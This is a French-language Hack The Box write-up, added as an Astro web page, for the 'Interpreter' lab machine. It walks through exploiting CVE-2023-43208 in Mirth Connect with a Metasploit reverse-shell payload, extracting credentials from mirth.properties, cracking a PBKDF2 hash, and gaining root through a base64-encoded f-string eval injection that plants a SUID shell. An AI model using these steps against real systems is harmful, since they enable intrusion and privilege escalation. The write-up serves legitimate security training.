@@ -1,0 +1,162 @@
+---
+import Layout from '../../layouts/Layout.astro'
+---
+<Layout title="HTB - Interpreter">
+
+  <div style="margin-bottom:2rem;">
+    <a href="/writeups" style="color:#475569; font-size:0.82rem;">← writeups</a>
+    <h1 style="font-size:1.8rem; font-weight:700; color:#e2e8f0; margin:0.75rem 0 0.5rem;">HTB - Interpreter</h1>
+    <div style="display:flex; flex-wrap:wrap; gap:0.5rem; align-items:center; margin-bottom:0.75rem;">
+      <span class="badge-medium">Medium</span>
+      <span style="color:#64748b;">·</span>
+      <span style="color:#94a3b8; font-size:0.82rem;">Linux (Debian)</span>
+      <span style="color:#64748b;">·</span>
+      <span style="color:#475569; font-size:0.8rem;">21 Feb 2026</span>
+    </div>
+    <div style="display:flex; flex-wrap:wrap; gap:0.35rem; margin-top:0.5rem;">
+      <span style="background:rgba(239,68,68,0.1); color:#f87171; border:1px solid rgba(239,68,68,0.25); padding:2px 8px; border-radius:4px; font-size:0.7rem; font-weight:700;">CVE-2023-43208</span>
+    </div>
+  </div>
+
+  <div style="background:var(--bg-800); border-left:3px solid #e67e22; border-top:1px solid var(--border); border-right:1px solid var(--border); border-bottom:1px solid var(--border); border-radius:0 8px 8px 0; padding:1rem 1.25rem; margin-bottom:2rem;">
+    <div style="color:#64748b; font-size:0.7rem; text-transform:uppercase; letter-spacing:0.05em; margin-bottom:0.4rem;">Résumé</div>
+    <p style="color:#94a3b8; font-size:0.88rem; line-height:1.7; margin:0;">Box Medium Linux — RCE non authentifié via désérialisation Java XStream dans Mirth Connect 4.4.0, credentials extraits de mirth.properties, crack d'un hash PBKDF2-HMAC-SHA256 à 600 000 itérations, puis injection f-string dans un service Flask tournant en root.</p>
+  </div>
+
+  <div style="margin-bottom:2.5rem;">
+    <div style="color:#334155; font-size:0.78rem; margin-bottom:0.75rem;">$ cat attack_chain.txt</div>
+    <div style="border:1px solid var(--border); border-radius:8px; overflow:hidden;">
+      <div style="background:#050508; padding:0.4rem 1rem; border-bottom:1px solid var(--border); color:#475569; font-size:0.7rem; text-transform:uppercase;">Chaîne d'exploitation</div>
+      {[
+        { n:'1', v:'Fingerprinting JNLP', r:'Mirth Connect 4.4.0 identifié' },
+        { n:'2', v:'CVE-2023-43208 — XStream Deserialization RCE', r:'Shell mirth via Metasploit' },
+        { n:'3', v:'mirth.properties credentials hardcodés', r:'Accès MariaDB' },
+        { n:'4', v:'Dump DB + PBKDF2 crack (Hashcat mode 10900)', r:'SSH sedric + user flag' },
+        { n:'5', v:'Python f-string eval() injection Flask root', r:'SUID bash → root flag' },
+      ].map((s,i,a) => (
+        <div style={"display:flex; gap:0.75rem; padding:0.7rem 1rem; background:var(--bg-800);" + (i<a.length-1?"border-bottom:1px solid #0d0d15;":"")}>
+          <div style="width:22px; height:22px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:0.7rem; font-weight:700; flex-shrink:0; background:#e67e2222; color:#e67e22; border:1px solid #e67e2244;">{s.n}</div>
+          <div><div style="color:#e2e8f0; font-size:0.82rem; font-weight:600;">{s.v}</div><div style="color:#475569; font-size:0.75rem; margin-top:0.1rem;">→ {s.r}</div></div>
+        </div>
+      ))}
+    </div>
+  </div>
+
+  <div class="prose">
+
+    <h2>1 — Fingerprinting : Mirth Connect 4.4.0</h2>
+    <pre is:raw>nmap -sC -sV -p- --min-rate 5000 10.129.244.184
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.2p1 Debian
+80/tcp   open  http    Jetty — Mirth Connect Administrator
+443/tcp  open  https   Jetty — Mirth Connect Administrator (SSL)
+6661/tcp open  unknown Mirth Connect internal communications
+
+# Le fichier JNLP expose la version exacte
+curl -sk https://10.129.244.184/webstart.jnlp | grep -i "version"
+# &lt;title&gt;NextGen Connect 4.4.0&lt;/title&gt;
+# → CVE-2023-43208 applicable</pre>
+
+    <h2>2 — CVE-2023-43208 via Metasploit</h2>
+    <p>Désérialisation Java non authentifiée dans le parsing XStream XML de Mirth Connect. L'endpoint XmlMessageBodyReader traite du XML contrôlé par l'attaquant sans authentification.</p>
+    <pre is:raw>use exploit/multi/http/mirth_connect_cve_2023_43208
+set RHOSTS 10.129.244.184
+set RPORT 443 && set SSL true
+set LHOST 10.10.14.51 && set LPORT 4444
+set payload cmd/unix/reverse_bash   # ← CRITIQUE : payloads x64 incompatibles
+set FETCH_COMMAND CURL
+run
+
+# [+] Version 4.4.0 is affected by CVE-2023-43208.
+# [*] Command shell session 1 opened
+# Shell : mirth@...</pre>
+    <div style="border-left:3px solid #f87171; background:rgba(239,68,68,0.06); padding:0.65rem 1rem; margin:0.75rem 0; border-radius:0 6px 6px 0; font-size:0.82rem; color:#fca5a5;">⚠️ BLOCAGE : Le payload aarch64 par défaut échoue silencieusement. Utiliser cmd/unix/reverse_bash obligatoirement. Les payloads linux/x64/meterpreter/reverse_tcp sont également incompatibles avec ce module.</div>
+    <pre is:raw># Stabilisation
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+# Ctrl+Z → stty raw -echo; fg
+export TERM=xterm</pre>
+
+    <h2>3 — mirth.properties & Crack PBKDF2</h2>
+    <pre is:raw>cat /usr/local/mirthconnect/conf/mirth.properties | grep -i "password\|user\|database"
+# database.username=mirthdb
+# database.password=[REDACTED]
+
+mysql -u mirthdb -p'[REDACTED]' -h 127.0.0.1 mc_bdd_prod
+# SELECT * FROM PERSON_PASSWORD;
+
+# Résultat :
+# username : sedric
+# Hash (Base64) : u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==
+# Algorithme    : PBKDF2-HMAC-SHA256 — 8 bytes salt + 32 bytes DK — 600 000 itérations</pre>
+    <pre is:raw># Extraction du sel et de la clé dérivée
+python3 -c "
+import base64
+data = base64.b64decode('u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==')
+salt = data[:8]; dk = data[8:]
+print(f'sha256:600000:{base64.b64encode(salt).decode()}:{base64.b64encode(dk).decode()}')
+"
+# sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=
+
+echo 'sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=' > hash.txt
+hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt --force
+# Status: Cracked — 2 min 3 sec, 84 H/s
+# → snowflake1
+
+ssh sedric@10.129.244.184
+cat ~/user.txt</pre>
+
+    <h2>4 — Python F-String Injection → root</h2>
+    <p>Flask root sur localhost:54321 exécute notif.py — double évaluation f-string via eval() :</p>
+    <pre is:raw># Code vulnérable dans notif.py :
+template = f"Patient {'{'}first{'}'} {'{'}last{'}'} ({'{'}gender{'}'}), ..."
+return eval(f"f'''{'{'}template{'}'}'''")   # ← injection ici</pre>
+    <p>Regex autorisé : a-z A-Z 0-9 . _ ' " ( ) {'{'} {'}'} = + /  — Bloqué : espaces, virgules, crochets, point-virgule.</p>
+    <pre is:raw># Encoder la commande en Base64 pour éliminer les espaces
+echo -n 'install -o root -m 4755 /bin/bash /tmp/.sh' | base64
+# aW5zdGFsbCAtbyByb290IC1tIDQ3NTUgL2Jpbi9iYXNoIC90bXAvLnNo
+
+# Payload pour le champ firstname :
+# {'{'}__import__("os").popen(__import__("base64").b64decode("aW5zdGFsbCAtbyByb290IC1tIDQ3NTUgL2Jpbi9iYXNoIC90bXAvLnNo").decode()).read(){'}'}
+
+wget -q -O - http://127.0.0.1:54321/addPatient \
+  --post-data '&lt;patient&gt;&lt;firstname&gt;PAYLOAD&lt;/firstname&gt;&lt;lastname&gt;Doe&lt;/lastname&gt;&lt;sender_app&gt;MirthConnect&lt;/sender_app&gt;&lt;timestamp&gt;2026/01/01&lt;/timestamp&gt;&lt;birth_date&gt;01/01/1990&lt;/birth_date&gt;&lt;gender&gt;M&lt;/gender&gt;&lt;/patient&gt;' \
+  --header "Content-Type: application/xml"
+
+ls -la /tmp/.sh   # -rwsr-xr-x 1 root root
+/tmp/.sh -p
+# .sh-5.2# whoami → root
+cat /root/root.txt</pre>
+
+  </div>
+
+  <div style="margin-bottom:2.5rem;">
+    <h2 style="color:var(--cyber); font-size:1.05rem; font-weight:700; border-bottom:1px solid rgba(0,255,157,0.2); padding-bottom:0.4rem; margin-bottom:1rem;">Leçons apprises</h2>
+    <div style="display:flex; flex-direction:column; gap:0.5rem;">
+      {[
+        'Mirth Connect < 4.4.1 : mettre à jour immédiatement — CVE-2023-43208 est critique',
+        'Credentials hardcodés dans mirth.properties = risque majeur, utiliser des secrets manager',
+        'PBKDF2 avec 600 000 itérations ne protège pas un mot de passe de dictionnaire',
+        'eval() sur des données utilisateur = vulnérabilité critique garantie',
+        'Base64 permet de bypass une regex bloquant les espaces dans les payloads f-string',
+      ].map(l => (
+        <div style="display:flex; gap:0.6rem; color:#94a3b8; font-size:0.85rem;"><span style="color:var(--cyber); flex-shrink:0;">→</span>{l}</div>
+      ))}
+    </div>
+  </div>
+
+  <div>
+    <h2 style="color:var(--cyber); font-size:1.05rem; font-weight:700; border-bottom:1px solid rgba(0,255,157,0.2); padding-bottom:0.4rem; margin-bottom:1rem;">Outils utilisés</h2>
+    <div style="display:flex; flex-wrap:wrap; gap:0.4rem;">
+      {['nmap','metasploit','mysql','python3','hashcat','ssh','wget'].map(t => (
+        <span style="background:#050508; border:1px solid #1a1a2e; padding:3px 10px; border-radius:6px; font-size:0.75rem; color:#64748b; font-family:monospace;">{t}</span>
+      ))}
+    </div>
+  </div>
+
+  <div style="margin-top:3rem; padding-top:1.5rem; border-top:1px solid var(--border); display:flex; justify-content:space-between;">
+    <a href="/writeups" style="color:#475569; font-size:0.85rem;">← Tous les writeups</a>
+    <a href="/about" style="color:var(--cyber); font-size:0.85rem;">About →</a>
+  </div>
+
+</Layout>
